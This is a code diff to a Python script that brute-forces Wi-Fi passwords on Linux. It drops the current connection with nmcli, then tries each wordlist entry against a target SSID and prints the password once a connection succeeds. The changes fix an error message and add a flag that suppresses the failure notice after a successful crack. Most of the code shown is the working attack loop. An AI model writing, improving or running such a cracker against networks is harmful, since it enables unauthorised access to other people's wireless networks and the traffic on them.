@@ -369,7 +369,7 @@ elif os_name == 'Linux':
             print("[-] Please Enter a Wordlist to begin this operation.")
             return
         elif SSID_TARGET == None:
-            print("[-] Please Enter a Wordlist to begin this operation.")
+            print("[-] Please Enter a Target/SSID to begin this operation.")
             return
         elif Current_Network_Usage == None:
             print("[+] Starting this operation in offline mode.")
@@ -379,10 +379,11 @@ elif os_name == 'Linux':
         print("-" * 50)
         
         attempt_count = 0
+        is_Network_Cracked = False
         try:
 
             if Current_Network_Usage is not None:
-                result = subprocess.run(['nmcli', 'c', 'down', Current_Network_Usage], capture_output=True, text=True)
+                result = subprocess.run(['nmcli', 'c', 'down', Current_Network_Usage], capture_output=True, text=True, check=False)
                 if result.returncode == 0:
                     print(f"[+] Disconnected from {Current_Network_Usage}")
                 else:
@@ -398,8 +399,6 @@ elif os_name == 'Linux':
                             
                     if not password:  # Skip empty lines
                         continue
-
-
                         
                     attempt_count += 1
                     print(f"[Attempt {attempt_count}] Trying password: {password}")
@@ -422,6 +421,7 @@ elif os_name == 'Linux':
                         if res.returncode == 0:
                             print("[+] Connected (nmcli reported success).")
                             print(f"[+] Network: {SSID_TARGET}, Password: {password}")
+                            is_Network_Cracked = True
                             break
                         else:
                             print("Invaild Password. Not connected.")
@@ -429,7 +429,8 @@ elif os_name == 'Linux':
                     
                     except Exception as e:
                         print(f"[-] A Critical Error Has Accured While Connecting. : {e}")
-            print(f"[!] Finished wordlist on {SSID_TARGET} And Still Didnt Crack the Password.")
+            if is_Network_Cracked == False:
+                print(f"[!] Finished wordlist on {SSID_TARGET} And Still Didnt Crack the Password.")
             
 
         except PermissionError:
